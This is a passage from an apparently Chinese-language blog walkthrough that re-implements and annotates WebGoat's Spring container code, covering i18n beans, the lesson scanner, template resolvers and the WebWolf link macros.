 pluginMessages.setFallbackToSystemLocale(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> pluginMessages;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Language <span class="title function_">language</span><span class="params">(LocaleResolver localeResolver)</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Language</span>(localeResolver);&#125;</span><br><span class="line"><span class="comment">//    配置语言</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Messages <span class="title function_">messageSource</span><span class="params">(Language language)</span>&#123;</span><br><span class="line">        <span class="type">Messages</span> <span class="variable">messages</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Messages</span>(language);</span><br><span class="line">        messages.setDefaultEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        messages.setBasename(<span class="string">&quot;classpath:i18n/messages&quot;</span>);</span><br><span class="line">        messages.setFallbackToSystemLocale(<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> messages;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LocaleResolver <span class="title function_">localeResolver</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">SessionLocaleResolver</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> LabelDebugger <span class="title function_">labelDebugger</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LabelDebugger</span>();&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="lessons-1"><a href="#lessons-1" class="headerlink" title="lessons"></a>lessons</h2><h3 id="LessonScanner"><a href="#LessonScanner" class="headerlink" title="LessonScanner"></a>LessonScanner</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.support.ResourcePatternResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="comment">//@Componnet是用在类上，声明这个类是一个组件被spring管理起来</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="comment">//使用日志组件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonScanner</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">lessonPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^.*/lessons/([^/]*)/.*$&quot;</span>);</span><br><span class="line"><span class="comment">//            使用的是Java中的Pattern.compile函数来实现对指定字符串的截取。 匹配 aaa/lessons//aaa 为啥匹配这个? 是文件名吗</span></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Set&lt;String &gt; lessons = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    用于存放读取到的lessons</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonScanner</span><span class="params">(ResourcePatternResolver resourcePatternResolver)</span>&#123;</span><br><span class="line">        <span class="comment">//       ResourcePatternResolver 用于解析资源文件的策略接口，其特殊的地方在于，它应该提供带有*号这种通配符的资源路径。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">var</span> <span class="variable">resources</span> <span class="operator">=</span> resourcePatternResolver.getResources(<span class="string">&quot;classpath:/lessons/*/*&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> resource : resources)&#123;</span><br><span class="line">                <span class="type">var</span> <span class="variable">url</span> <span class="operator">=</span> resource.getURL();</span><br><span class="line"><span class="comment">//                这里的url我感觉是路径的意思 其实是一个file协议去读取lessons的内容</span></span><br><span class="line">                <span class="type">var</span> <span class="variable">matcher</span> <span class="operator">=</span> lessonPattern.matcher(url.toString());</span><br><span class="line">                <span class="keyword">if</span> (matcher.matches())&#123;</span><br><span class="line"><span class="comment">//                    如果匹配到了就添加到上面的lessons中数组中</span></span><br><span class="line">                    lessons.add(matcher.group(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            log.debug(<span class="string">&quot;Found &#123;&#125; lessons&quot;</span>,lessons.size());</span><br><span class="line"><span class="comment">//            打印日志看看找到了多少个lessons文件</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            log.warn(<span class="string">&quot;No lessons found...&quot;</span>);</span><br><span class="line"><span class="comment">//            打印lessons没有找到的日志</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//                加载多文件</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;String &gt; applyPattern(String pattern)&#123;</span><br><span class="line">        <span class="keyword">return</span> lessons.stream().map(lesson -&gt; String.format(pattern,lesson)).toList();</span><br><span class="line"><span class="comment">//        使用stream() 将源数据—包括集合、数组等转换成流  将集合中的每一个字符进行格式化输出 将数据存储到列表中</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703144834368.png" alt="image-20220703144834368"></p>
<h2 id="LessonTemplateResolver"><a href="#LessonTemplateResolver" class="headerlink" title="LessonTemplateResolver"></a>LessonTemplateResolver</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.IEngineConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresolver.FileTemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.ITemplateResource;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.StringTemplateResource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LessonTemplateResolver</span> <span class="keyword">extends</span> <span class="title class_">FileTemplateResolver</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;lesson:&quot;</span>;</span><br><span class="line"><span class="comment">//    定义前缀</span></span><br><span class="line">    <span class="keyword">private</span> ResourceLoader resourceLoader;</span><br><span class="line"><span class="comment">//    定义资源加载器</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String ,<span class="type">byte</span>[]&gt; resources = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="comment">//    定义容器存放加载到的文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LessonTemplateResolver</span><span class="params">(ResourceLoader resourceLoader)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.resourceLoader = resourceLoader;</span><br><span class="line">        setResolvablePatterns(Set.of(PREFIX + <span class="string">&quot;*&quot;</span>));</span><br><span class="line"><span class="comment">//        设置新的 模式 应用建立的 模板可以通过这个模板解析器来解决。  Set.of用于简单的创建不可变的少量元素的集合</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> ITemplateResource <span class="title function_">computeTemplateResource</span><span class="params">(IEngineConfiguration configuration,String ownerTemplate, String template, String resourceName, String characterEncoding, Map&lt;String, Object&gt; templateResolutionAttributes)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">templateName</span> <span class="operator">=</span> resourceName.substring(PREFIX.length());</span><br><span class="line"><span class="comment">//        截取模板的名字</span></span><br><span class="line">        <span class="type">byte</span>[] resource = resources.get(templateName);</span><br><span class="line"><span class="comment">//        获取存在map中的这个值</span></span><br><span class="line">        <span class="keyword">if</span> (resource == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                resource = resourceLoader.getResource(<span class="string">&quot;classpath:/&quot;</span> + templateName).getInputStream().readAllBytes();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                log.error(<span class="string">&quot;Unable to find lesson HTML:&#123;&#125;&quot;</span>,template);</span><br><span class="line">            &#125;</span><br><span class="line">            resources.put(templateName,resource);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringTemplateResource</span>(<span class="keyword">new</span> <span class="title class_">String</span>(resource, StandardCharsets.UTF_8));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="AsciiDoctorTemplateResolver-java"><a href="#AsciiDoctorTemplateResolver-java" class="headerlink" title="AsciiDoctorTemplateResolver.java"></a>AsciiDoctorTemplateResolver.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ************************************************************************************************</span></span><br><span class="line"><span class="comment"> * This file is part of WebGoat, an Open Web Application Security Project utility. For details,</span></span><br><span class="line"><span class="comment"> * please see http://www.owasp.org/</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2002 - 2014 Bruce Mayhew</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This program is free software; you can redistribute it and/or modify it under the terms of the</span></span><br><span class="line"><span class="comment"> * GNU General Public License as published by the Free Software Foundation; either version 2 of the</span></span><br><span class="line"><span class="comment"> * License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without</span></span><br><span class="line"><span class="comment"> * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU</span></span><br><span class="line"><span class="comment"> * General Public License for more details.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * You should have received a copy of the GNU General Public License along with this program; if</span></span><br><span class="line"><span class="comment"> * not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA</span></span><br><span class="line"><span class="comment"> * 02111-1307, USA.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Getting Source ==============</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * Source for this application is maintained at https://github.com/WebGoat/WebGoat, a repository for free software</span></span><br><span class="line"><span class="comment"> * projects.</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> WebGoat</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> $Id: $Id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> December 12, 2015</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> org.owasp.webgoat.container;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.Asciidoctor;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.JavaExtensionRegistry;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.OperatingSystemMacro;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.UsernameMacro;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.WebGoatTmpDirMacro;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.WebGoatVersionMacro;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.WebWolfMacro;</span><br><span class="line"><span class="keyword">import</span> org.owasp.webgoat.container.asciidoc.WebWolfRootMacro;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.ResourceLoader;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.IEngineConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresolver.FileTemplateResolver;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.ITemplateResource;</span><br><span class="line"><span class="keyword">import</span> org.thymeleaf.templateresource.StringTemplateResource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.asciidoctor.Asciidoctor.Factory.create;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Thymeleaf resolver for AsciiDoc used in the lesson, can be used as follows inside a lesson file:</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;code&gt;</span></span><br><span class="line"><span class="comment"> * &lt;div th:replace=&quot;doc:AccessControlMatrix_plan.adoc&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/code&gt;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsciiDoctorTemplateResolver</span> <span class="keyword">extends</span> <span class="title class_">FileTemplateResolver</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Asciidoctor</span> <span class="variable">asciidoctor</span> <span class="operator">=</span> create();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PREFIX</span> <span class="operator">=</span> <span class="string">&quot;doc:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ResourceLoader resourceLoader;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AsciiDoctorTemplateResolver</span><span class="params">(ResourceLoader resourceLoader)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.resourceLoader = resourceLoader;</span><br><span class="line">        setResolvablePatterns(Set.of(PREFIX + <span class="string">&quot;*&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> ITemplateResource <span class="title function_">computeTemplateResource</span><span class="params">(IEngineConfiguration configuration, String ownerTemplate, String template, String resourceName, String characterEncoding, Map&lt;String, Object&gt; templateResolutionAttributes)</span> &#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">templateName</span> <span class="operator">=</span> resourceName.substring(PREFIX.length());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> resourceLoader.getResource(<span class="string">&quot;classpath:/&quot;</span> + templateName).getInputStream()) &#123;</span><br><span class="line">            <span class="type">JavaExtensionRegistry</span> <span class="variable">extensionRegistry</span> <span class="operator">=</span> asciidoctor.javaExtensionRegistry();</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;webWolfLink&quot;</span>, WebWolfMacro.class);</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;webWolfRootLink&quot;</span>, WebWolfRootMacro.class);</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;webGoatVersion&quot;</span>, WebGoatVersionMacro.class);</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;webGoatTempDir&quot;</span>, WebGoatTmpDirMacro.class);</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;operatingSystem&quot;</span>, OperatingSystemMacro.class);</span><br><span class="line">            extensionRegistry.inlineMacro(<span class="string">&quot;username&quot;</span>, UsernameMacro.class);</span><br><span class="line"></span><br><span class="line">            <span class="type">StringWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>();</span><br><span class="line">            asciidoctor.convert(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is), writer, createAttributes());</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringTemplateResource</span>(writer.getBuffer().toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringTemplateResource</span>(<span class="string">&quot;&lt;div&gt;Unable to find documentation for: &quot;</span> + templateName + <span class="string">&quot; &lt;/div&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, Object&gt; <span class="title function_">createAttributes</span><span class="params">()</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; attributes = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        attributes.put(<span class="string">&quot;source-highlighter&quot;</span>, <span class="string">&quot;coderay&quot;</span>);</span><br><span class="line">        attributes.put(<span class="string">&quot;backend&quot;</span>, <span class="string">&quot;xhtml&quot;</span>);</span><br><span class="line">        attributes.put(<span class="string">&quot;icons&quot;</span>, org.asciidoctor.Attributes.FONT_ICONS);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; options = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        options.put(<span class="string">&quot;attributes&quot;</span>, attributes);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> options;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703205540754.png" alt="image-20220703205540754"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220703205741992.png" alt="image-20220703205741992"></p>
<h2 id="asciidoc"><a href="#asciidoc" class="headerlink" title="asciidoc"></a>asciidoc</h2><h3 id="WebWolfMacro"><a href="#WebWolfMacro" class="headerlink" title="WebWolfMacro"></a>WebWolfMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.ast.ContentNode;</span><br><span class="line"><span class="keyword">import</span> org.asciidoctor.extension.InlineMacroProcessor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolfMacro</span> <span class="keyword">extends</span> <span class="title class_">InlineMacroProcessor</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebWolfMacro</span><span class="params">(String macroName)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebWolfMacro</span><span class="params">(String macroName, Map&lt;String, Object&gt; config)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName,config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">process</span><span class="params">(ContentNode contentNode,String linkText,Map&lt;String,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">env</span> <span class="operator">=</span> EnvironmentExposure.getEnv();</span><br><span class="line">        <span class="type">var</span> <span class="variable">hostname</span> <span class="operator">=</span> determineHost(env.getProperty(<span class="string">&quot;webwolf.port&quot;</span>));</span><br><span class="line"><span class="comment">//        这里的webwolf.port其实就是配置文件中的webwolf端口</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">target</span> <span class="operator">=</span> (String ) attributes.getOrDefault(<span class="string">&quot;target&quot;</span>,<span class="string">&quot;home&quot;</span>);</span><br><span class="line"><span class="comment">//        这里设定默认值为home?</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">href</span> <span class="operator">=</span> hostname + <span class="string">&quot;/&quot;</span> +target;</span><br><span class="line">        <span class="keyword">if</span> (displayCompleteLinkNoFormatting(attributes))&#123;</span><br><span class="line"><span class="comment">//            判断是一个nolink的话</span></span><br><span class="line">            linkText = href;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">var</span> <span class="variable">options</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String ,Object&gt;();</span><br><span class="line">        options.put(<span class="string">&quot;type&quot;</span>,<span class="string">&quot;:link&quot;</span>);</span><br><span class="line">        options.put(<span class="string">&quot;target&quot;</span>,href);</span><br><span class="line">        attributes.put(<span class="string">&quot;window&quot;</span>,<span class="string">&quot;_blank&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> createPhraseNode(contentNode,<span class="string">&quot;anchor&quot;</span>,linkText,attributes,options).convert();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">displayCompleteLinkNoFormatting</span><span class="params">(Map&lt;String ,Object&gt; attributes)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> attributes.values().stream().anyMatch(a-&gt;a.equals(<span class="string">&quot;noLink&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">determineHost</span><span class="params">(String port)</span>&#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;Host&quot;</span>);</span><br><span class="line"><span class="comment">//        获取请求头中的host</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">semicolonIndex</span> <span class="operator">=</span> host.indexOf(<span class="string">&quot;:&quot;</span>);</span><br><span class="line"><span class="comment">//        将host以:进行分割获取:的位置</span></span><br><span class="line">        <span class="keyword">if</span> (semicolonIndex == -<span class="number">1</span> || host.endsWith(<span class="string">&quot;:80&quot;</span>))&#123;</span><br><span class="line"><span class="comment">//            如果没有找到: 或者host是以:80结尾,那么就将:80进行替换 将www.web ...进行替换</span></span><br><span class="line">            host = host.replace(<span class="string">&quot;:80&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;www.webgoat.local&quot;</span>,<span class="string">&quot;www.webwolf.local&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            host = host.substring(<span class="number">0</span>,semicolonIndex);</span><br><span class="line">            <span class="comment">//            将host以semicolonIndex 进行分割</span></span><br><span class="line">            host = host.concat(<span class="string">&quot;:&quot;</span>).concat(port);</span><br><span class="line"><span class="comment">//            将9090进行拼接进去</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;http://&quot;</span>+host +(includeWebWolfContext() ? <span class="string">&quot;/WebWolf&quot;</span>:<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">includeWebWolfContext</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以自己调试一下</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220704140556124.png" alt="image-20220704140556124"></p>
<h3 id="EnvironmentExposure"><a href="#EnvironmentExposure" class="headerlink" title="EnvironmentExposure"></a>EnvironmentExposure</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.core.env.Environment;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContextAware;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EnvironmentExposure</span> <span class="keyword">implements</span> <span class="title class_">ApplicationContextAware</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> ApplicationContext context;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Environment <span class="title function_">getEnv</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> context.getEnvironment();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setApplicationContext</span><span class="params">(ApplicationContext applicationContext)</span> <span class="keyword">throws</span> BeansException &#123;</span><br><span class="line">        context = applicationContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="WebWolfRootMacro"><a href="#WebWolfRootMacro" class="headerlink" title="WebWolfRootMacro"></a>WebWolfRootMacro</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.asciidoc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolfRootMacro</span> <span class="keyword">extends</span> <span class="title class_">WebWolfMacro</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebWolfRootMacro</span><span class="params">(String macroName)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebWolfRootMacro</span><span class="params">(String macroName, Map&lt;String,Object&gt; config)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(macroName,config);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">includeWebWolfContext</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

